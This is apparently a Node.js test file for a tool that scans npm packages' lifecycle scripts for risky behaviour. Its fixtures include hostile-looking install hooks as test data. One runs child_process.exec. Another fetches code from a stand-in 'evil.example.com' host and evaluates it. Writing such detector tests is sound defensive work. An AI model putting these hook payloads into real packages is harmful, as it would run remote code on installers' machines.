#!/usr/bin/env node
'use strict'

// Tests for script-analyzer.js.

const { test } = require('node:test')
const assert = require('node:assert/strict')
const {
  LIFECYCLE_SCRIPT_NAMES,
  extractScripts,
  analyzeScript,
  analyzeManifest,
  computeRiskLevel,
  aggregateResults,
  buildFindingsTable,
  buildSummaryTable,
} = require('./script-analyzer.js')

test('LIFECYCLE_SCRIPT_NAMES covers npm lifecycle hooks', () => {
  assert.deepEqual(LIFECYCLE_SCRIPT_NAMES, [
    'preinstall',
    'install',
    'postinstall',
    'prepublish',
    'preprepare',
    'prepare',
    'postprepare',
  ])
})

test('extractScripts returns only lifecycle scripts', () => {
  const manifest = {
    scripts: {
      preinstall: 'node preinstall.js',
      install: 'node install.js',
      postinstall: 'node postinstall.js',
      test: 'node test.js',
      build: 'node build.js',
    },
  }
  const scripts = extractScripts(manifest)
  assert.equal(Object.keys(scripts).length, 3)
  assert.ok(!scripts.test)
  assert.ok(!scripts.build)
  assert.equal(scripts.preinstall, 'node preinstall.js')
})

test('extractScripts returns empty object when scripts missing', () => {
  assert.deepEqual(extractScripts({}), {})
  assert.deepEqual(extractScripts({ scripts: null }), {})
  assert.deepEqual(extractScripts({ scripts: { test: 'node test.js' } }), {})
})

test('analyzeScript detects child process execution', () => {
  const findings = analyzeScript(
    'postinstall',
    "require('child_process').exec('id')",
    'evil@1.0.0',
  )
  assert.equal(findings.length, 1)
  assert.equal(findings[0].pattern, 'child-process')
  assert.equal(findings[0].level, 'high')
})

test('analyzeScript detects network and eval together', () => {
  const findings = analyzeScript(
    'postinstall',
    "fetch('https://evil.example.com').then(r => r.text()).then(eval)",
    'evil@1.0.0',
  )
  assert.ok(findings.some((f) => f.pattern === 'network-outbound'))
  assert.ok(findings.some((f) => f.pattern === 'eval-like'))
})

test('analyzeScript ignores harmless scripts', () => {
  const findings = analyzeScript('install', 'node-gyp rebuild', 'native@1.0.0')
  assert.equal(findings.length, 1)
  assert.equal(findings[0].pattern, 'native-build')
})

test('analyzeManifest aggregates findings across scripts', () => {
  const manifest = {
    scripts: {
      preinstall: "require('fs').writeFileSync('/tmp/x', 'x')",
      postinstall: "fetch('https://example.com')",
    },
  }
  const result = analyzeManifest('pkg', '1.0.0', manifest)
  assert.equal(result.package, 'pkg@1.0.0')
  assert.equal(result.hasLifecycleScripts, true)
  assert.equal(result.riskLevel, 'high')
  assert.ok(result.findings.some((f) => f.pattern === 'fs-write'))
  assert.ok(result.findings.some((f) => f.pattern === 'network-outbound'))
})

test('analyzeManifest returns none when no lifecycle scripts', () => {
  const result = analyzeManifest('pkg', '1.0.0', {
    scripts: { test: 'node test.js' },
  })
  assert.equal(result.hasLifecycleScripts, false)
  assert.equal(result.riskLevel, 'none')
  assert.equal(result.findings.length, 0)
})

test('computeRiskLevel returns highest present level', () => {
  assert.equal(computeRiskLevel([]), 'none')
  assert.equal(computeRiskLevel([{ level: 'low' }]), 'low')
  assert.equal(
    computeRiskLevel([{ level: 'low' }, { level: 'medium' }]),
    'medium',
  )
  assert.equal(
    computeRiskLevel([{ level: 'medium' }, { level: 'high' }]),
    'high',
  )
})

test('aggregateResults computes totals and max risk', () => {
  const results = [
    analyzeManifest('a', '1.0.0', { scripts: { install: 'node-gyp rebuild' } }),
    analyzeManifest('b', '1.0.0', {
      scripts: { postinstall: "fetch('https://x.com')" },
    }),
    analyzeManifest('c', '1.0.0', { scripts: { test: 'node test.js' } }),
  ]
  const summary = aggregateResults(results)
  assert.equal(summary.totalPackages, 3)
  assert.equal(summary.packagesWithScripts, 2)
  assert.equal(summary.riskLevel, 'high')
  assert.equal(summary.totalFindings, 2)
  assert.equal(summary.findingsByLevel.high, 1)
  assert.equal(summary.findingsByLevel.medium, 1)
})

test('buildFindingsTable returns message when no findings', () => {
  const output = buildFindingsTable([
    analyzeManifest('a', '1.0.0', { scripts: { test: 'node test.js' } }),
  ])
  assert.ok(output.includes('No risky'))
})

test('buildFindingsTable renders findings', () => {
  const results = [
    analyzeManifest('pkg', '1.0.0', {
      scripts: { postinstall: "require('child_process').exec('id')" },
    }),
  ]
  const output = buildFindingsTable(results)
  assert.ok(output.includes('HIGH'))
  assert.ok(output.includes('pkg@1.0.0'))
  assert.ok(output.includes('postinstall'))
})

test('buildSummaryTable reports none status', () => {
  const output = buildSummaryTable([
    analyzeManifest('pkg', '1.0.0', { scripts: { test: 'node test.js' } }),
  ])
  assert.ok(output.includes('✅'))
  assert.ok(output.includes('NONE'))
})

test('buildSummaryTable reports warning status', () => {
  const output = buildSummaryTable([
    analyzeManifest('pkg', '1.0.0', {
      scripts: { install: 'node-gyp rebuild' },
    }),
  ])
  assert.ok(output.includes('⚠️'))
  assert.ok(output.includes('MEDIUM'))
})
